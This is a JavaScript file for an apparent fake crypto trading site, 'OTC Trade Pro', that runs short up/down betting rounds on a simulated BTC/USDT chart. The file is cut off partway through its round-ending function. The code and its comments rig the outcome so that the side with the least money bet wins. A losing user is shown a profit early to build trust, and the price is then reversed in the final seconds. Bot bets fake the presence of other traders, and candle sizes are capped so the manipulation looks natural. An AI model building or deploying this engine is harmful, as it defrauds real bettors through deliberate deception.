/* ============================================
   OTC Trade Pro — Core Application Logic
   ============================================
   
   Algorithm:
   - Each round has a configurable duration (default 30s)
   - Betting is open for first 70% of the round
   - Last 30% is "locked" (no more bets)
   - If no bets placed: price moves randomly
   - If bets placed: price moves in direction where 
     LEAST money is bet (house always wins)
   - Price updates continuously during the round
   ============================================ */

(function () {
  'use strict';

  // ========================================
  // Configuration
  // ========================================
  const CONFIG = {
    ROUND_DURATION: 15,        // seconds per round (default 15s like screenshot)
    BET_LOCK_PERCENT: 0.8,     // betting closes at 80% of round
    PAYOUT_MULTIPLIER: 1.92,   // payout ratio 92% profit
    INITIAL_BALANCE: 9379.63,  // exact balance from screenshot
    INITIAL_PRICE: 71420.93,   // exact price from screenshot
    MIN_BET: 5,
    MAX_BET: 10000,
    PRICE_VOLATILITY: 0.00045, // max % price move per tick (natural, small)
    TICK_INTERVAL: 400,        // ms between price updates
    CANDLE_WIDTH_RATIO: 0.6,
    MAX_CANDLES: 60,
    BOT_BET_CHANCE: 0.6,       // chance bots bet each round
    BOT_MIN_BET: 20,
    BOT_MAX_BET: 300,

    // ── Smart Manipulation Settings ──
    USER_WIN_RATE: 0.22,       // 22% natural chance user wins
    REVERSAL_START_SEC: 4,     // seconds before end to start reversing
    REVERSAL_RAMP_SEC: 2,      // last N seconds = aggressive reversal
    PROFIT_PHASE_BIAS: 0.72,   // 72% of ticks favor user during profit phase
    REVERSAL_BIAS: 0.88,       // 88% of ticks go against user during reversal
    MAX_CANDLE_MOVE_PCT: 0.0025,// cap candle range so no giant candles appear
  };

  // ========================================
  // State
  // ========================================
  const state = {
    balance: CONFIG.INITIAL_BALANCE,
    currentPrice: CONFIG.INITIAL_PRICE,
    currentAsset: 'BTC/USDT',
    showMA: true,
    roundNumber: 0,
    roundTimer: CONFIG.ROUND_DURATION,
    roundPhase: 'betting', // 'betting' | 'locked' | 'result'
    roundInterval: null,
    tickInterval: null,

    // Bets for current round
    bets: {
      up: { total: 0, count: 0 },
      down: { total: 0, count: 0 },
    },
    userBet: null, // { direction: 'up'|'down', amount: number, entryPrice: number, candleIndex: number }

    // Candle data
    candles: [],
    currentCandle: null,

    // Trade history
    history: [],

    // Chart
    chartType: 'candle', // 'candle' | 'line'
    timeframe: 15,       // round duration selected

    // ── Smart Manipulation State ──
    roundShouldWin: false,     // decided at round start
    consecutiveLosses: 0,      // track to give pity wins
    totalRoundsPlayed: 0,      // rounds where user bet
    totalWins: 0,              // user wins so far
    avgCandleRange: 0,         // average candle body size for natural sizing
  };

  // ========================================
  // DOM Elements
  // ========================================
  const DOM = {
    navPrice: document.getElementById('nav-price'),
    navChange: document.getElementById('nav-change'),
    navVolume: document.getElementById('nav-volume'),
    navSpread: document.getElementById('nav-spread'),
    userBalance: document.getElementById('user-balance'),
    roundNumber: document.getElementById('round-number'),
    timerValue: document.getElementById('timer-value'),
    timerProgress: document.getElementById('timer-progress'),
    roundPhase: document.getElementById('round-phase'),
    betAmount: document.getElementById('bet-amount'),
    potentialProfit: document.getElementById('potential-profit'),
    btnUp: document.getElementById('btn-up'),
    btnDown: document.getElementById('btn-down'),
    upPoolAmount: document.getElementById('up-pool-amount'),
    upPoolCount: document.getElementById('up-pool-count'),
    downPoolAmount: document.getElementById('down-pool-amount'),
    downPoolCount: document.getElementById('down-pool-count'),
    upPoolDisplay: document.getElementById('up-pool-display'),
    downPoolDisplay: document.getElementById('down-pool-display'),
    poolProgressFill: document.getElementById('pool-progress-fill'),
    poolAlgoHint: document.getElementById('pool-algo-hint'),
    positionSection: document.getElementById('position-section'),
    positionDirection: document.getElementById('position-direction'),
    posEntry: document.getElementById('pos-entry'),
    posAmount: document.getElementById('pos-amount'),
    posPnl: document.getElementById('pos-pnl'),
    historyList: document.getElementById('history-list'),
    clearHistory: document.getElementById('clear-history'),
    resultOverlay: document.getElementById('result-overlay'),
    resultCard: document.getElementById('result-card'),
    resultIcon: document.getElementById('result-icon'),
    resultTitle: document.getElementById('result-title'),
    resultAmount: document.getElementById('result-amount'),
    resultDetails: document.getElementById('result-details'),
    resultClose: document.getElementById('result-close'),
    toastContainer: document.getElementById('toast-container'),
    mainChart: document.getElementById('main-chart'),
    volumeChart: document.getElementById('volume-chart'),
    chartContainer: document.getElementById('chart-container'),
    priceLine: document.getElementById('price-line'),
    priceTag: document.getElementById('price-tag'),
    ohlcO: document.getElementById('ohlc-o'),
    ohlcH: document.getElementById('ohlc-h'),
    ohlcL: document.getElementById('ohlc-l'),
    ohlcC: document.getElementById('ohlc-c'),
    betSection: document.querySelector('.bet-section'),
  };

  // ========================================
  // Utilities
  // ========================================
  function formatPrice(price) {
    return '$' + price.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  }

  function formatMoney(amount) {
    if (Math.abs(amount) >= 1e9) return '$' + (amount / 1e9).toFixed(1) + 'B';
    if (Math.abs(amount) >= 1e6) return '$' + (amount / 1e6).toFixed(1) + 'M';
    if (Math.abs(amount) >= 1e3) return '$' + (amount / 1e3).toFixed(1) + 'K';
    return '$' + amount.toFixed(2);
  }

  function randomRange(min, max) {
    return Math.random() * (max - min) + min;
  }

  function clamp(val, min, max) {
    return Math.min(Math.max(val, min), max);
  }

  // ========================================
  // Toast Notifications
  // ========================================
  function showToast(message, type = 'info') {
    const icons = { success: '✓', error: '✗', info: 'ℹ', warning: '⚠' };
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.innerHTML = `
      <span class="toast-icon">${icons[type]}</span>
      <span class="toast-msg">${message}</span>
    `;
    DOM.toastContainer.appendChild(toast);
    setTimeout(() => {
      toast.classList.add('removing');
      setTimeout(() => toast.remove(), 300);
    }, 3000);
  }

  // ========================================
  // Balance Management
  // ========================================
  function updateBalance(amount) {
    state.balance += amount;
    DOM.userBalance.textContent = formatPrice(state.balance);
  }

  // ========================================
  // Candlestick Chart Rendering
  // ========================================
  function initChart() {
    resizeCanvas();
    window.addEventListener('resize', () => {
      resizeCanvas();
      renderChart();
    });
  }

  function resizeCanvas() {
    const container = DOM.chartContainer;
    const rect = container.getBoundingClientRect();
    const dpr = window.devicePixelRatio || 1;

    DOM.mainChart.width = rect.width * dpr;
    DOM.mainChart.height = rect.height * dpr;
    DOM.mainChart.style.width = rect.width + 'px';
    DOM.mainChart.style.height = rect.height + 'px';

    const volRect = DOM.volumeChart.parentElement.getBoundingClientRect();
    DOM.volumeChart.width = volRect.width * dpr;
    DOM.volumeChart.height = volRect.height * dpr;
    DOM.volumeChart.style.width = volRect.width + 'px';
    DOM.volumeChart.style.height = volRect.height + 'px';
  }

  function renderChart() {
    const canvas = DOM.mainChart;
    const ctx = canvas.getContext('2d');
    const dpr = window.devicePixelRatio || 1;
    const w = canvas.width / dpr;
    const h = canvas.height / dpr;

    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
    ctx.clearRect(0, 0, w, h);

    const allCandles = [...state.candles];
    if (state.currentCandle) allCandles.push(state.currentCandle);
    if (allCandles.length === 0) return;

    const rightPadding = 74;
    const topPadding = 32;
    const bottomPadding = 26;
    const chartW = w - rightPadding;
    const chartH = h - topPadding - bottomPadding;

    // Calculate visible candles (fits mobile screen comfortably)
    const maxVisible = Math.min(allCandles.length, 28);
    const visible = allCandles.slice(-maxVisible);

    // Find price range
    let minP = Infinity, maxP = -Infinity;
    for (const c of visible) {
      if (c.low < minP) minP = c.low;
      if (c.high > maxP) maxP = c.high;
    }
    if (state.userBet) {
      minP = Math.min(minP, state.userBet.entryPrice);
      maxP = Math.max(maxP, state.userBet.entryPrice);
    }
    const pRange = maxP - minP || 10;
    const padding = pRange * 0.18;
    minP -= padding;
    maxP += padding;

    const priceToY = (p) => topPadding + chartH - ((p - minP) / (maxP - minP)) * chartH;
    const candleSpacing = chartW / (maxVisible + 1);
    const candleW = Math.max(5, candleSpacing * 0.58);

    // ── Horizontal Grid Lines & Price Labels ──
    const gridLevels = 6;
    ctx.lineWidth = 0.5;
    for (let i = 0; i <= gridLevels; i++) {
      const price = minP + (maxP - minP) * (i / gridLevels);
      const y = priceToY(price);

      // Grid line
      ctx.strokeStyle = 'rgba(38, 50, 77, 0.45)';
      ctx.beginPath();
      ctx.moveTo(0, y);
      ctx.lineTo(chartW, y);
      ctx.stroke();

      // Right axis price label
      ctx.fillStyle = '#61718c';
      ctx.font = '10px JetBrains Mono, monospace';
      ctx.textAlign = 'left';
      ctx.fillText(price.toFixed(2), chartW + 6, y + 3.5);
    }

    // ── Bottom Time Scale Labels (HH:MM) ──
    ctx.fillStyle = '#61718c';
    ctx.font = '10px JetBrains Mono, monospace';
    ctx.textAlign = 'center';
    const timeStep = Math.max(4, Math.floor(maxVisible / 4));
    for (let i = 0; i < visible.length; i += timeStep) {
      const c = visible[i];
      if (c && c.time) {
        const d = new Date(c.time);
        const timeStr = String(d.getHours()).padStart(2, '0') + ':' + String(d.getMinutes()).padStart(2, '0');
        const x = (i + 1) * candleSpacing;
        ctx.fillText(timeStr, x, h - 8);
      }
    }

    // ── Moving Average (MA 7) Line ──
    if (state.showMA && visible.length >= 7) {
      ctx.save();
      ctx.strokeStyle = 'rgba(240, 165, 0, 0.75)';
      ctx.lineWidth = 1.5;
      ctx.beginPath();
      let started = false;
      for (let i = 6; i < visible.length; i++) {
        let sum = 0;
        for (let j = i - 6; j <= i; j++) {
          sum += visible[j].close;
        }
        const ma = sum / 7;
        const x = (i + 1) * candleSpacing;
        const y = priceToY(ma);
        if (!started) {
          ctx.moveTo(x, y);
          started = true;
        } else {
          ctx.lineTo(x, y);
        }
      }
      ctx.stroke();
      ctx.restore();
    }

    // ── Candlesticks or Area Line ──
    if (state.chartType === 'candle') {
      visible.forEach((candle, i) => {
        const x = (i + 1) * candleSpacing;
        const isGreen = candle.close >= candle.open;
        const color = isGreen ? '#00c087' : '#f6465d';
        const bodyTop = priceToY(Math.max(candle.open, candle.close));
        const bodyBot = priceToY(Math.min(candle.open, candle.close));
        const bodyH = Math.max(bodyBot - bodyTop, 1.5);

        // Wick
        ctx.strokeStyle = color;
        ctx.lineWidth = 1.2;
        ctx.beginPath();
        ctx.moveTo(x, priceToY(candle.high));
        ctx.lineTo(x, priceToY(candle.low));
        ctx.stroke();

        // Body
        ctx.fillStyle = color;
        ctx.fillRect(x - candleW / 2, bodyTop, candleW, bodyH);

        // Subtle glow for current candle
        if (i === visible.length - 1 && state.currentCandle) {
          ctx.shadowColor = color;
          ctx.shadowBlur = 6;
          ctx.fillRect(x - candleW / 2, bodyTop, candleW, bodyH);
          ctx.shadowBlur = 0;
        }
      });
    } else {
      // Line Chart Area
      ctx.strokeStyle = '#26A5F6';
      ctx.lineWidth = 2.5;
      ctx.lineJoin = 'round';
      ctx.beginPath();
      visible.forEach((candle, i) => {
        const x = (i + 1) * candleSpacing;
        const y = priceToY(candle.close);
        if (i === 0) ctx.moveTo(x, y);
        else ctx.lineTo(x, y);
      });
      ctx.stroke();

      const lastX = visible.length * candleSpacing;
      ctx.lineTo(lastX, h - bottomPadding);
      ctx.lineTo(candleSpacing, h - bottomPadding);
      ctx.closePath();
      const grad = ctx.createLinearGradient(0, topPadding, 0, h);
      grad.addColorStop(0, 'rgba(38, 165, 246, 0.25)');
      grad.addColorStop(1, 'rgba(38, 165, 246, 0)');
      ctx.fillStyle = grad;
      ctx.fill();
    }

    // ── Active Trade Overlay (Matching User Reference Image) ──
    if (state.userBet) {
      const isBuy = state.userBet.direction === 'up';
      const entryPrice = state.userBet.entryPrice;
      const entryY = priceToY(entryPrice);
      const currentY = priceToY(state.currentPrice);
      const isProfitable = isBuy ? (state.currentPrice >= entryPrice) : (state.currentPrice <= entryPrice);
      const tradeColor = isProfitable ? '#00c087' : '#f6465d';

      ctx.save();

      // 1. Horizontal dotted line at entry price
      ctx.setLineDash([4, 4]);
      ctx.strokeStyle = '#00c087';
      ctx.lineWidth = 1.2;
      ctx.beginPath();
      ctx.moveTo(0, entryY);
      ctx.lineTo(chartW, entryY);
      ctx.stroke();
      ctx.setLineDash([]);

      // 2. Right Axis Entry Badge: e.g. "BUY 71393.58"
      const entryBadgeW = 72;
      const entryBadgeH = 18;
      const entryBadgeY = entryY - entryBadgeH / 2;
      ctx.fillStyle = isBuy ? '#00c087' : '#f6465d';
      ctx.fillRect(chartW + 2, entryBadgeY, entryBadgeW, entryBadgeH);

      ctx.fillStyle = '#0a0e17';
      ctx.font = 'bold 9px JetBrains Mono, monospace';
      ctx.textAlign = 'left';
      ctx.fillText((isBuy ? 'BUY ' : 'SELL ') + entryPrice.toFixed(0), chartW + 5, entryY + 3.5);

      // 3. Trade Entry Marker & Arrow directly on chart
      // Find the candle x position where trade was placed
      let entryX = chartW - candleSpacing * 1.5;
      if (state.userBet.candleIndex !== undefined) {
        const offsetFromEnd = allCandles.length - 1 - state.userBet.candleIndex;
        if (offsetFromEnd < visible.length && offsetFromEnd >= 0) {
          entryX = (visible.length - offsetFromEnd) * candleSpacing;
        }
      }

      // Entry dot/box on candle
      ctx.fillStyle = tradeColor;
      ctx.fillRect(entryX - 4, entryY - 4, 8, 8);

      // Vertical stem from entryY towards current price
      const stemLen = 42;
      const targetY = isBuy ? (entryY - stemLen) : (entryY + stemLen);
      ctx.strokeStyle = tradeColor;
      ctx.lineWidth = 1.8;
      ctx.beginPath();
      ctx.moveTo(entryX, entryY);
      ctx.lineTo(entryX, targetY);
      ctx.stroke();

      // Arrowhead pointing in trade direction
      const arrowSize = 6;
      ctx.fillStyle = tradeColor;
      ctx.beginPath();
      if (isBuy) {
        ctx.moveTo(entryX, targetY - arrowSize * 1.5);
        ctx.lineTo(entryX - arrowSize, targetY);
        ctx.lineTo(entryX + arrowSize, targetY);
      } else {
        ctx.moveTo(entryX, targetY + arrowSize * 1.5);
        ctx.lineTo(entryX - arrowSize, targetY);
        ctx.lineTo(entryX + arrowSize, targetY);
      }
      ctx.closePath();
      ctx.fill();

      // Tag above/below arrow: "$50.00 (00:03)"
      const mm = String(Math.floor(state.roundTimer / 60)).padStart(2, '0');
      const ss = String(state.roundTimer % 60).padStart(2, '0');
      const tagText = `$${state.userBet.amount.toFixed(2)} (${mm}:${ss})`;

      ctx.font = 'bold 11px JetBrains Mono, monospace';
      ctx.textAlign = 'center';
      const textY = isBuy ? (targetY - arrowSize * 1.5 - 6) : (targetY + arrowSize * 1.5 + 14);

      // Soft dark background pill behind tag text for high legibility
      const textMetrics = ctx.measureText(tagText);
      const pillW = textMetrics.width + 10;
      const pillH = 18;
      ctx.fillStyle = 'rgba(10, 14, 23, 0.85)';
      ctx.fillRect(entryX - pillW / 2, textY - 13, pillW, pillH);

      ctx.fillStyle = tradeColor;
      ctx.fillText(tagText, entryX, textY);

      // 4. Compact Unrealized P&L Badge in Top Right
      const pnlDir = isBuy ? 1 : -1;
      const priceDiff = (state.currentPrice - entryPrice) * pnlDir;
      const pnlPercent = priceDiff / entryPrice;
      const pnlValue = pnlPercent * state.userBet.amount * CONFIG.PAYOUT_MULTIPLIER;
      const pnlIsPos = pnlValue >= 0;

      const pnlBadgeX = chartW - 140;
      const pnlBadgeY = topPadding - 18;
      ctx.fillStyle = pnlIsPos ? 'rgba(0, 192, 135, 0.15)' : 'rgba(246, 70, 93, 0.15)';
      ctx.strokeStyle = pnlIsPos ? 'rgba(0, 192, 135, 0.4)' : 'rgba(246, 70, 93, 0.4)';
      ctx.lineWidth = 1;
      ctx.fillRect(pnlBadgeX, pnlBadgeY, 134, 24);
      ctx.strokeRect(pnlBadgeX, pnlBadgeY, 134, 24);

      ctx.fillStyle = pnlIsPos ? '#00c087' : '#f6465d';
      ctx.font = 'bold 11px JetBrains Mono, monospace';
      ctx.textAlign = 'center';
      const pnlStr = (pnlIsPos ? '+' : '') + '$' + pnlValue.toFixed(2) + ' (' + (pnlPercent * 100).toFixed(2) + '%)';
      ctx.fillText(pnlStr, pnlBadgeX + 67, pnlBadgeY + 16);

      ctx.restore();
    }

    // ── Update HTML Current Price Line Position & Tag ──
    const currentP = state.currentPrice;
    const pLineY = priceToY(currentP);
    DOM.priceLine.style.top = pLineY + 'px';
    DOM.priceTag.textContent = formatPrice(currentP);

    const isUp = state.currentCandle && state.currentCandle.close >= state.currentCandle.open;
    DOM.priceTag.style.background = isUp ? 'var(--green)' : 'var(--red)';

    // Update OHLC display
    if (state.currentCandle) {
      DOM.ohlcO.textContent = state.currentCandle.open.toFixed(2);
      DOM.ohlcH.textContent = state.currentCandle.high.toFixed(2);
      DOM.ohlcL.textContent = state.currentCandle.low.toFixed(2);
      DOM.ohlcC.textContent = state.currentCandle.close.toFixed(2);
    }

    // Render volume bars if volume element exists
    if (DOM.volumeChart) {
      renderVolume(visible, candleSpacing, candleW);
    }
  }

  function renderVolume(candles, spacing, barW) {
    const canvas = DOM.volumeChart;
    const ctx = canvas.getContext('2d');
    const dpr = window.devicePixelRatio || 1;
    const w = canvas.width / dpr;
    const h = canvas.height / dpr;

    ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
    ctx.clearRect(0, 0, w, h);

    if (candles.length === 0) return;

    let maxVol = 0;
    for (const c of candles) {
      if (c.volume > maxVol) maxVol = c.volume;
    }
    if (maxVol === 0) maxVol = 1;

    const rightPadding = 80;
    const chartW = w - rightPadding;
    const recalcSpacing = chartW / (candles.length + 1);

    candles.forEach((candle, i) => {
      const x = (i + 1) * recalcSpacing;
      const isGreen = candle.close >= candle.open;
      const barH = (candle.volume / maxVol) * (h - 8);

      ctx.fillStyle = isGreen ? 'rgba(0, 229, 160, 0.35)' : 'rgba(255, 59, 92, 0.35)';
      ctx.fillRect(x - barW / 2, h - barH - 4, barW, barH);
    });
  }

  // ========================================
  // Price Movement Engine (Smart Manipulation)
  // ========================================
  //
  // 3-Phase Strategy when user has a bet:
  //   Phase 1 — "Confidence" (betting open → lock + early locked)
  //     Price drifts IN the user's favor. They see green P&L.
  //     Builds trust: "I was winning, just got unlucky."
  //
  //   Phase 2 — "Flatten" (mid locked phase)
  //     Price wobbles near entry, looks undecided.
  //
  //   Phase 3 — "Reversal" (last ~5 seconds)
  //     Price subtly reverses against user to end in loss.
  //     Moves are kept small & natural — no giant red candles.
  //
  // ~20% of the time, skip Phase 3 and let the user win.
  // After 3+ consecutive losses, force a win (pity win).
  // ========================================

  // ========================================
  // Lowest Bet Side Algorithm & Price Engine
  // ========================================
  //
  // Color Prediction / House Advantage Model:
  // - System calculates total amount bet on UP vs DOWN.
  // - Whichever side has LEAST money placed is strictly
  //   designated as the winning side so the house always
  //   collects the larger pool and pays the smaller pool!
  // - If user bet on the lowest side: user wins!
  // - If user bet on the higher side: user loses (system wins)!
  // - During early phase: price can show profit to look genuine.
  // - During closing seconds: price smoothly steers to the lowest bet side.
  // ========================================

  function getLowestBetSide() {
    const up = state.bets.up.total;
    const down = state.bets.down.total;
    if (up === 0 && down === 0) return null;
    if (up < down) return 'up';
    if (down < up) return 'down';
    return 'up'; // tie-breaker
  }

  function generatePriceTick() {
    const volatility = CONFIG.PRICE_VOLATILITY;
    let direction;
    let magnitude;
    const lowestSide = getLowestBetSide();

    if (!lowestSide) {
      // ── No bets placed on either side: natural random walk ──
      direction = Math.random() > 0.5 ? 1 : -1;
      magnitude = randomRange(0.0001, volatility);
    } else {
      const lowestDir = lowestSide === 'up' ? 1 : -1;
      const secsLeft = state.roundTimer;

      if (state.userBet) {
        const userDir = state.userBet.direction === 'up' ? 1 : -1;
        const userOnLowestSide = state.userBet.direction === lowestSide;

        // How far price has moved from entry
        const distFromEntry = (state.currentPrice - state.userBet.entryPrice) / state.userBet.entryPrice;
        const userInProfit = distFromEntry * userDir > 0;

        if (userOnLowestSide) {
          // ── User bet on the LOWEST side: user will win! ──
          direction = Math.random() < 0.68 ? userDir : -userDir;
          magnitude = randomRange(0.0001, volatility * 0.75);
          if (Math.abs(distFromEntry) > 0.0012) {
            magnitude *= 0.4;
            if (Math.random() < 0.35) direction = -userDir;
          }
        } else {
          // ── User bet on HIGHER side: lowest side must win (user loses) ──
          if (secsLeft > CONFIG.REVERSAL_START_SEC) {
            // Early phase: show user in profit to build confidence & realism!
            direction = Math.random() < CONFIG.PROFIT_PHASE_BIAS ? userDir : -userDir;
            magnitude = randomRange(0.0001, volatility * 0.7);
            if (Math.abs(distFromEntry) > 0.0014) {
              magnitude *= 0.35;
              if (Math.random() < 0.5) direction = -userDir;
            }
          } else {
            // Final reversal phase (last ~3-4 seconds): smoothly steer to lowest side
            direction = Math.random() < CONFIG.REVERSAL_BIAS ? lowestDir : -lowestDir;
            magnitude = randomRange(0.0002, volatility * 1.0);
            if (userInProfit) {
              magnitude = randomRange(0.00025, volatility * 1.15);
            }
            if (!userInProfit && Math.abs(distFromEntry) > 0.0008) {
              magnitude *= 0.3;
            }
          }
        }
      } else {
        // Only bot bets: natural walk, subtly guiding toward lowest side in final seconds
        if (secsLeft > CONFIG.REVERSAL_START_SEC) {
          direction = Math.random() > 0.5 ? 1 : -1;
          magnitude = randomRange(0.0001, volatility * 0.65);
        } else {
          direction = Math.random() < 0.75 ? lowestDir : -lowestDir;
          magnitude = randomRange(0.00015, volatility * 0.85);
        }
      }
    }

    // ── Candle size cap: prevents giant suspicious candles ──
    const candleRange = state.currentCandle
      ? (state.currentCandle.high - state.currentCandle.low) / state.currentCandle.open
      : 0;
    if (candleRange > CONFIG.MAX_CANDLE_MOVE_PCT * 0.8) {
      magnitude *= 0.25;
    }

    const change = state.currentPrice * magnitude * direction;
    const noise = state.currentPrice * randomRange(-0.00008, 0.00008);

    state.currentPrice += change + noise;
    state.currentPrice = parseFloat(state.currentPrice.toFixed(2));

    // Update current candle
    if (state.currentCandle) {
      state.currentCandle.close = state.currentPrice;
      state.currentCandle.high = Math.max(state.currentCandle.high, state.currentPrice);
      state.currentCandle.low = Math.min(state.currentCandle.low, state.currentPrice);
      state.currentCandle.volume += Math.abs(change) * randomRange(40, 160);
    }

    updatePriceDisplay();
    renderChart();
  }

  function decideRoundOutcome() {
    // In strict Lowest Bet Side model, the outcome is dynamically governed by the pools.
    const lowest = getLowestBetSide();
    if (!state.userBet || !lowest) {
      state.roundShouldWin = false;
      return;
    }
    state.roundShouldWin = (state.userBet.direction === lowest);
  }

  function updatePriceDisplay() {
    const price = state.currentPrice;
    if (DOM.navPrice) DOM.navPrice.textContent = formatPrice(price);

    const basePrice = CONFIG.INITIAL_PRICE;
    const changePercent = ((price - basePrice) / basePrice * 100);
    if (DOM.navChange) {
      DOM.navChange.textContent = (changePercent >= 0 ? '+' : '') + changePercent.toFixed(2) + '%';
      DOM.navChange.className = 'stat-value ' + (changePercent >= 0 ? 'price-up' : 'price-down');
    }

    // Update position P&L
    if (state.userBet && DOM.posPnl) {
      const pnlDir = state.userBet.direction === 'up' ? 1 : -1;
      const priceDiff = (price - state.userBet.entryPrice) * pnlDir;
      const pnlPercent = priceDiff / state.userBet.entryPrice;
      const pnlValue = pnlPercent * state.userBet.amount * CONFIG.PAYOUT_MULTIPLIER;

      DOM.posPnl.textContent = (pnlValue >= 0 ? '+' : '') + formatPrice(pnlValue);
      DOM.posPnl.className = 'pnl-value ' + (pnlValue >= 0 ? 'price-up' : 'price-down');
    }
  }

  // ========================================
  // Bot System & Live Pool Display
  // ========================================
  function simulateBots(count = 1) {
    if (state.roundPhase !== 'betting') return;

    for (let i = 0; i < count; i++) {
      const dir = Math.random() > 0.48 ? 'up' : 'down';
      const amount = Math.round(randomRange(CONFIG.BOT_MIN_BET, CONFIG.BOT_MAX_BET) / 10) * 10;

      state.bets[dir].total += amount;
      state.bets[dir].count += 1;
    }

    updatePoolDisplay();
  }

  function updatePoolDisplay() {
    const upTotal = state.bets.up.total;
    const downTotal = state.bets.down.total;
    const total = upTotal + downTotal;

    if (DOM.upPoolDisplay) DOM.upPoolDisplay.textContent = formatMoney(upTotal);
    if (DOM.downPoolDisplay) DOM.downPoolDisplay.textContent = formatMoney(downTotal);
    if (DOM.upPoolAmount) DOM.upPoolAmount.textContent = formatMoney(upTotal);
    if (DOM.downPoolAmount) DOM.downPoolAmount.textContent = formatMoney(downTotal);

    if (DOM.poolProgressFill) {
      const upPct = total > 0 ? (upTotal / total) * 100 : 50;
      DOM.poolProgressFill.style.width = upPct + '%';
    }

    if (DOM.poolAlgoHint) {
      if (total === 0) {
        DOM.poolAlgoHint.textContent = 'Least Bet Wins';
      } else if (upTotal < downTotal) {
        DOM.poolAlgoHint.innerHTML = '<span class="lowest-pill">⚡ Lowest: BUY</span>';
      } else if (downTotal < upTotal) {
        DOM.poolAlgoHint.innerHTML = '<span class="lowest-pill">⚡ Lowest: SELL</span>';
      } else {
        DOM.poolAlgoHint.textContent = 'Pools Equal';
      }
    }
  }

  // ========================================
  // Round Management
  // ========================================
  function startNewRound() {
    state.roundNumber++;
    state.roundTimer = CONFIG.ROUND_DURATION;
    state.roundPhase = 'betting';
    state.bets = { up: { total: 0, count: 0 }, down: { total: 0, count: 0 } };
    state.userBet = null;

    // Create new candle
    state.currentCandle = {
      open: state.currentPrice,
      high: state.currentPrice,
      low: state.currentPrice,
      close: state.currentPrice,
      volume: randomRange(100, 500),
      time: Date.now(),
    };

    // Pre-seed pools with initial bot liquidity so both sides have active bets
    const seedUp = Math.round(randomRange(80, 250) / 10) * 10;
    const seedDown = Math.round(randomRange(100, 320) / 10) * 10;
    state.bets.up.total = seedUp;
    state.bets.up.count = Math.floor(randomRange(1, 3));
    state.bets.down.total = seedDown;
    state.bets.down.count = Math.floor(randomRange(1, 3));

    // Update UI
    if (DOM.roundNumber) DOM.roundNumber.textContent = 'Round #' + String(state.roundNumber).padStart(3, '0');
    if (DOM.positionSection) DOM.positionSection.style.display = 'none';
    DOM.btnUp.classList.remove('placed', 'disabled');
    DOM.btnDown.classList.remove('placed', 'disabled');
    if (DOM.betSection) DOM.betSection.classList.remove('locked');

    updatePoolDisplay();
    updateTimerDisplay();
    updatePhaseDisplay();

    // Stagger bot bets during the betting countdown
    setTimeout(() => simulateBots(Math.floor(randomRange(1, 3))), 1800);
    setTimeout(() => simulateBots(Math.floor(randomRange(1, 2))), 4200);
    setTimeout(() => simulateBots(Math.floor(randomRange(1, 3))), 7500);

    // Start round timer
    if (state.roundInterval) clearInterval(state.roundInterval);
    state.roundInterval = setInterval(roundTick, 1000);

    // Start price tick
    if (state.tickInterval) clearInterval(state.tickInterval);
    state.tickInterval = setInterval(generatePriceTick, CONFIG.TICK_INTERVAL);
  }

  function roundTick() {
    state.roundTimer--;

    // Check phase transitions (lock bets at lock threshold)
    const lockTime = Math.floor(CONFIG.ROUND_DURATION * (1 - CONFIG.BET_LOCK_PERCENT));
    if (state.roundTimer <= lockTime && state.roundPhase === 'betting') {
      state.roundPhase = 'locked';
      updatePhaseDisplay();
      if (DOM.betSection) DOM.betSection.classList.add('locked');
      DOM.btnUp.classList.add('disabled');
      DOM.btnDown.classList.add('disabled');
      if (!state.userBet) {
        showToast('Betting locked. Resolving round...', 'warning');
      }
    }

    updateTimerDisplay();

    if (state.roundTimer <= 0) {
      endRound();
    }
  }

  function updateTimerDisplay() {
    if (DOM.timerValue) DOM.timerValue.textContent = Math.max(0, state.roundTimer);

    if (DOM.timerProgress) {
      const circumference = 2 * Math.PI * 52;
      const progress = (1 - state.roundTimer / CONFIG.ROUND_DURATION) * circumference;
      DOM.timerProgress.style.strokeDashoffset = progress;
    }
  }

  function updatePhaseDisplay() {
    if (!DOM.roundPhase) return;
    const phaseEl = DOM.roundPhase;
    const dotEl = phaseEl.querySelector('.phase-dot');

    if (state.roundPhase === 'betting') {
      if (dotEl) dotEl.className = 'phase-dot betting';
      const label = phaseEl.querySelector('span:last-child');
      if (label) label.textContent = 'Betting Open';
    } else if (state.roundPhase === 'locked') {
      if (dotEl) dotEl.className = 'phase-dot locked';
      const label = phaseEl.querySelector('span:last-child');
      if (label) label.textContent = 'Bets Locked';
    } else {
      if (dotEl) dotEl.className = 'phase-dot result';
      const label = phaseEl.querySelector('span:last-child');
      if (label) label.textContent = 'Round Complete';
    }
  }

  function endRound() {
    clearInterval(state.roundInterval);
    clearInterval(state.tickInterval);
    state.roundPhase = 'result';
    updatePhaseDisplay();

    // ── STRICT LOWEST BET SIDE WINS ALGO ──
    const lowestSide = getLowestBetSide() || (Math.random() > 0.5 ? 'up' : 'down');
    const openPrice = state.currentCandle ? state.currentCandle.open : state.currentPrice;
    const benchmarkPrice = state.userBet ? state.userBet.entryPrice : openPrice;

    // Strictly enforce price finishes on the lowest side by a natural small margin
    const naturalMargin = Math.max(2.5, benchmarkPrice * randomRange(0.0002, 0.00035));
    if (lowestSide === 'up') {
      if (state.currentPrice <= benchmarkPrice) {
        state.currentPrice = parseFloat((benchmarkPrice + naturalMargin).toFixed(2));
      }
    } else {
      if (state.currentPrice >= benchmarkPrice) {
        state.currentPrice = parseFloat((benchmarkPrice - naturalMargin).toFixed(2));
      }
    }

    // Finalize candle
    if (state.currentCandle) {
      state.currentCandle.close = state.currentPrice;
      state.currentCandle.high = Math.max(state.currentCandle.high, state.currentPrice);
      state.currentCandle.low = Math.min(state.currentCandle.low, state.currentPrice);
      state.candles.push({ ...state.currentCandle });

      if (state.candles.length > CONFIG.MAX_CANDLES) {
        state.candles = state.candles.slice(-CONFIG.MAX_CANDLES);
      }
    }

    // Determine result
    const closePrice = state.currentPrice;
    const priceWentUp = closePrice > benchmarkPrice;
    const actualWinningSide = priceWentUp ? 'up' : 'down';

    // Calculate house profit
    const winningPool = Math.min(state.bets.up.total, state.bets.down.total);
    const losingPool = Math.max(state.bets.up.total, state.bets.down.total);
    const houseProfit = losingPool - (winningPool * (CONFIG.PAYOUT_MULTIPLIER - 1));

    // Show result to user
    if (state.userBet) {
      const userWon = (state.userBet.direction === actualWinningSide);
      state.totalRoundsPlayed++;

      if (userWon) {
        state.totalWins++;
